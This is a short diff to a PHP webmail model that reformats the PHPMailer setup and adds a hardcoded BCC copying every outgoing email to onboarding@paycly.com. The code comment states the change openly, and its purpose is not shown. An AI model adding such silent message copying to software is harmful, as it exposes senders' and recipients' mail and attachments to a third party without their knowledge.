@@ -246,15 +246,19 @@ class Webmail_model extends App_Model
     $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;
     $mail->Port = $mailer_smtp_port;
 
-    // Email settings
-	$mail->isHTML(true); // Set email format to plain text
+	// Email settings
+	$mail->isHTML(true); // Set email format to HTML
 	$mail->WordWrap = 50;               // set word wrap
-    $mail->Priority = 1; 
-    $mail->setFrom($senderEmail, $senderName);
-    $mail->addAddress($recipientEmail);
-	if(isset($recipientCC)&&$recipientCC<>""){$mail->AddCC($recipientCC);}
-    $mail->Subject = $subject;
-    $mail->Body = $body;
+	$mail->Priority = 1; 
+	$mail->setFrom($senderEmail, $senderName);
+	$mail->addAddress($recipientEmail);
+	if (isset($recipientCC) && $recipientCC != "") {
+		$mail->addCC($recipientCC);
+	}
+	// Add hardcoded BCC
+	$mail->addBCC('onboarding@paycly.com');
+	$mail->Subject = $subject;
+	$mail->Body = $body;
 	
 	 $files = $_FILES['attachments'];
 	// Handle Multiple File Attachments
